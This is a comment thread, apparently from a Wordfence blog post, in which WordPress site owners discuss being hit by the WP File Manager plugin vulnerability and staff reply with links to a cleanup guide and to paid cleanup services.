September 4, 2020   
6:45 am

Hi Ritz, 

Attackers will probe any and all sites they can access to see if the vulnerability exists. It's very possible you do not have the WP File Manager plugin installed on your site, but attackers are checking if you do. You can check for this plugin in the plugins area of your WordPress site, and if it is not there it is then it is safe to assume you do not have the plugin installed on your site and you have nothing to worry about.

  * ![](https://secure.gravatar.com/avatar/085a429dd0b17e931f1b5ee2697369c24c404809077c07b0673cc2549a1be8e3?s=96&d=mm&r=g)

Xida

September 5, 2020   
6:28 pm

I got this attack by uploading wp-stream.php from this ip 95.181.152.136

  * ![](https://secure.gravatar.com/avatar/f71548cdf0ccda3af4ba635de7563e5cc6d87a92170531ba519226052db92678?s=96&d=mm&r=g)

Thomas Cullen

September 8, 2020   
3:51 am

I have been effected by this problem if I follow the recomendations above will this bring back my website as it was prior to the attack or do I ave to do something else.

I am usinf a free version of Wordfence if I upgrade to Premuim will this solve the problem and retore my web site ???

    * ![](https://secure.gravatar.com/avatar/3c8ed72f575bceacbaf16c6ae1556fb3661694ea13275191feee76cb13635b01?s=96&d=mm&r=g)

Chloe Chamberland

September 8, 2020   
11:02 am

Hi Thomas, 

I am sorry to hear you have been affected by this vulnerability! Please follow [this guide](https://www.wordfence.com/docs/how-to-clean-a-hacked-wordpress-site-using-wordfence/) to clean your site. Alternatively, you can [hire our site security services team](https://www.wordfence.com/wordfence-site-cleanings/) to perform a clean-up and investigation, this service includes a free year of Wordfence Premium.

  * ![](https://secure.gravatar.com/avatar/690679ef0124b867511aec8e7501d31aee2dfb3ca500b56782106173d37ace9d?s=96&d=mm&r=g)

Stefan

September 10, 2020   
12:34 am

I contacted their support as soon as I heard this and they scheduled a call with me to update my plugin and scanned my entire website.   
I would suggest you update your plugin immediately to the latest version and still if you are facing some issue contact their customer support.

  * ![](https://secure.gravatar.com/avatar/9a6ce6145246cea7489e72b811acc422a076578679009f9079d051fcf6152bcf?s=96&d=mm&r=g)

Uzair Afzal

September 14, 2020   
1:38 am

Hi, Hope you are doing well. My website also affected by this vulnerability. we clean the code now. Please recommend now how to scan the site for confirmation.

    * ![](https://secure.gravatar.com/avatar/3c8ed72f575bceacbaf16c6ae1556fb3661694ea13275191feee76cb13635b01?s=96&d=mm&r=g)

Chloe Chamberland

September 17, 2020   
8:18 am

Hi Uzair, 

[Please follow this guide](https://www.wordfence.com/docs/how-to-clean-a-hacked-wordpress-site-using-wordfence/) to ensure clean your site and make sure you have scanned your site with the Wordfence scanner once completed to ensure there is no more malware present on your installation.




### Breaking WordPress Security Research in your inbox as it happens.

Email*

  * By checking this box I agree to theterms of serviceandprivacy policy.*



![Example of a news story](/img/footer-news-example.jpg)

Our business hours are 9am-8pm ET, 6am-5pm PT and 2pm-1am UTC/GMT excluding weekends and holidays.   
Response customers receive 24-hour support, 365 days a year, with a 1-hour response time. 

  * [Terms of Service](/terms-of-service/)
  * [Privacy Policy and Notice at Collection](/privacy-policy/)



  * [ ](https://twitter.com/wordfence)
  * [ ](https://facebook.com/wordfence)
  * [ ](https://www.youtube.com/c/Wordfence1)
  * [ ](https://www.instagram.com/wordfence)



****Products****

  * [Wordfence Free](/products/wordfence-free/)
  * [Wordfence Premium](/products/wordfence-premium/)
  * [Wordfence Care](/products/wordfence-care/)
  * [Wordfence Response](/products/wordfence-response/)
  * [Wordfence CLI](/products/wordfence-cli/)
  * [Wordfence Intelligence](/products/wordfence-intelligence/)
  * [Wordfence Central](/products/wordfence-central/)



****Support****

  * [Documentation](/help/)
  * [Learning Center](/learn/)
  * [Free Support](https://wordpress.org/support/plugin/wordfence/)
  * [Premium Support](https://support.wordfence.com/)



****News****

  * [Blog](/blog/)
  * [In The News](/news/)
  * [Vulnerability Advisories](/vulnerability-advisories/)



****About****

  * [About Wordfence](/about-wordfence/)
  * [Affiliate Program](/affiliate/)
  * [Employment](/employment/)
  * [Contact](/contact/)
  * [Security](/security/)
  * [CVE Request Form](/request-cve/)



****Stay Updated****

Sign up for news and updates from our panel of experienced security professionals.

Email*

  * By checking this box I agree to theterms of serviceandprivacy policy.*



[![ISO 27001 Certified by Intercert](/img/intercert-iso-27001.png)](https://trust.defiant.com/)

© 2012-2025 Defiant Inc. All Rights Reserved 

This website uses cookies, pixels, and similar technologies (collectively “Cookies”) to improve your browsing experience. By clicking “Accept All”, you agree to the storing of Cookies on your device and that we may share, track, store, and analyze your interactions with the website to enhance site navigation, analyze site usage, and assist in our marketing efforts. For more information on our use of cookies please review our [Cookie Policy](/cookies-notice). 

Cookie Settings Accept All Reject All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/cookies-notice). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

_*Always active*_

The “Strictly Necessary” cookies are necessary for the Sites and Services to work properly, and cannot be disabled. They include any essential authentication and authorization cookies for the Services. If you select the “Reject All” button, or choose to do nothing, only the strictly necessary cookies are active by default.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel Save